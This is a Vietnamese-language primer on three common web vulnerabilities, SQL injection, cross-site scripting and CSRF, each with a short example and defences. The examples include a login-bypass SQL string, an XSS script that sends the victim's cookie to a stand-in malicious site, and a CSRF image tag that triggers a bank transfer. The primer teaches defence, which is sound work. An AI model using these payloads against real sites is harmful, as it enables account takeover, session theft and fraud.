# Các Lỗ hổng Bảo mật Phổ biến

## Định nghĩa

Các lỗ hổng bảo mật (Common Vulnerabilities) là những điểm yếu trong mã nguồn, thiết kế, hoặc cấu hình của một hệ thống phần mềm mà kẻ tấn công có thể khai thác để thực hiện các hành vi không mong muốn, như đánh cắp dữ liệu, phá hoại hệ thống, hoặc chiếm quyền kiểm soát. Việc hiểu và phòng chống các lỗ hổng phổ biến là trách nhiệm cơ bản của mọi kỹ sư phần mềm.

---

## Các Lỗ hổng Tiêu biểu

Dưới đây là một số lỗ hổng kinh điển và phổ biến nhất trong các ứng dụng web.

### 1. SQL Injection (Tấn công Chèn mã SQL)

#### Vấn đề là gì?

Đây là một trong những lỗ hổng nguy hiểm và lâu đời nhất. Nó xảy ra khi ứng dụng web không kiểm tra hoặc lọc dữ liệu đầu vào từ người dùng một cách cẩn thận trước khi đưa vào câu lệnh truy vấn cơ sở dữ liệu (SQL). Kẻ tấn công có thể "chèn" (inject) thêm các đoạn mã SQL độc hại của riêng mình vào dữ liệu đầu vào đó.

#### Ví dụ dễ hiểu

Giả sử một trang web có form đăng nhập. Câu lệnh SQL để kiểm tra user có thể trông như thế này:
`SELECT * FROM users WHERE username = '[username_input]' AND password = '[password_input]'`

Một người dùng bình thường sẽ nhập `username` và `password` của họ. Nhưng kẻ tấn công sẽ nhập vào ô username một chuỗi độc hại như:
`' OR '1'='1`

Khi đó, câu lệnh SQL đầy đủ sẽ trở thành:
`SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '[password_input]'`

Vì điều kiện `'1'='1'` luôn đúng, mệnh đề `WHERE` sẽ trả về `TRUE` cho tất cả các dòng trong bảng `users`, cho phép kẻ tấn công đăng nhập thành công mà không cần biết mật khẩu, thậm chí là đăng nhập với quyền của người dùng đầu tiên trong CSDL (thường là admin).

#### Cách phòng chống

- **Sử dụng Prepared Statements (Câu lệnh Tham số hóa):** Đây là phương pháp hiệu quả nhất. Thay vì nối chuỗi để tạo câu lệnh SQL, ta sử dụng các tham số đại diện (`?` hoặc `:name`). Dữ liệu đầu vào sẽ được truyền riêng và được coi là "dữ liệu" chứ không phải "mã lệnh", do đó triệt tiêu hoàn toàn khả năng chèn mã.
- **Kiểm tra và Lọc dữ liệu đầu vào (Input Validation & Sanitization):** Luôn kiểm tra dữ liệu từ người dùng (đúng định dạng, độ dài...) và loại bỏ các ký tự nguy hiểm.

---

### 2. Cross-Site Scripting (XSS)

#### Vấn đề là gì?

XSS xảy ra khi một ứng dụng web cho phép kẻ tấn công chèn các đoạn mã độc hại (thường là JavaScript) vào nội dung của một trang web, và sau đó mã này sẽ được thực thi trên trình duyệt của người dùng nạn nhân.

#### Ví dụ dễ hiểu

Hãy tưởng tượng một trang blog có phần bình luận (comment). Một người dùng bình thường sẽ viết một bình luận như "Bài viết hay quá!". Nhưng kẻ tấn công sẽ viết một bình luận chứa mã JavaScript:
`<script>alert('Bạn đã bị hack!'); document.location='http://trangweb-doc-hai.com?cookie=' + document.cookie;</script>`

Nếu trang web không lọc đầu vào cẩn thận, nó sẽ lưu đoạn mã này vào cơ sở dữ liệu và hiển thị nó ra cho tất cả những người dùng khác đọc bình luận. Khi một người dùng vô tội truy cập vào trang, trình duyệt của họ sẽ thực thi đoạn mã `<script>` này, và có thể:

- Hiển thị một thông báo giả mạo.
- Đánh cắp cookie phiên đăng nhập của họ và gửi về cho kẻ tấn công.

#### Cách phòng chống

- **Mã hóa Output (Output Encoding):** Đây là cách phòng chống chính. Khi hiển thị dữ liệu do người dùng nhập ra trang web, hãy chuyển đổi các ký tự đặc biệt của HTML thành các thực thể an toàn. Ví dụ, `<` sẽ được chuyển thành `&lt;`, `>` thành `&gt;`. Khi đó, trình duyệt sẽ hiển thị đoạn mã đó dưới dạng văn bản thuần túy thay vì thực thi nó.
- **Lọc dữ liệu đầu vào (Input Sanitization):** Loại bỏ hoặc vô hiệu hóa các thẻ HTML và JavaScript nguy hiểm từ dữ liệu đầu vào của người dùng.

---

### 3. Cross-Site Request Forgery (CSRF)

#### Vấn đề là gì?

CSRF là một kiểu tấn công lừa trình duyệt của một người dùng đã đăng nhập thực hiện một hành động không mong muốn trên một trang web mà họ tin cậy. Kẻ tấn công tạo ra một yêu cầu giả mạo và lừa người dùng thực thi nó.

#### Ví dụ dễ hiểu

Giả sử bạn đã đăng nhập vào trang ngân hàng `mybank.com`. Trang này cho phép chuyển tiền bằng một URL đơn giản như: `https://mybank.com/transfer?to=recipient&amount=100`.

Bây giờ, kẻ tấn công gửi cho bạn một email với một hình ảnh trông có vẻ vô hại, nhưng mã HTML của nó lại là:
`<img src="https://mybank.com/transfer?to=attacker&amount=1000" width="1" height="1" />`

Khi bạn mở email này, trình duyệt của bạn sẽ tự động cố gắng tải hình ảnh từ URL đó. Vì bạn vẫn đang đăng nhập vào `mybank.com`, trình duyệt sẽ gửi kèm cookie xác thực của bạn theo yêu cầu. Máy chủ của ngân hàng sẽ thấy đây là một yêu cầu hợp lệ từ bạn và thực hiện giao dịch chuyển 1000$ vào tài khoản của kẻ tấn công mà bạn không hề hay biết.

#### Cách phòng chống

- **Sử dụng Anti-CSRF Tokens:** Đây là phương pháp phổ biến nhất. Khi người dùng truy cập một form (ví dụ: form chuyển tiền), máy chủ sẽ tạo ra một chuỗi token ngẫu nhiên, duy nhất và ẩn nó trong form. Khi người dùng gửi form, token này sẽ được gửi cùng. Máy chủ sẽ kiểm tra xem token được gửi lên có khớp với token nó đã tạo cho phiên đó không. Kẻ tấn công không thể biết được token này, do đó yêu cầu giả mạo của chúng sẽ bị từ chối.
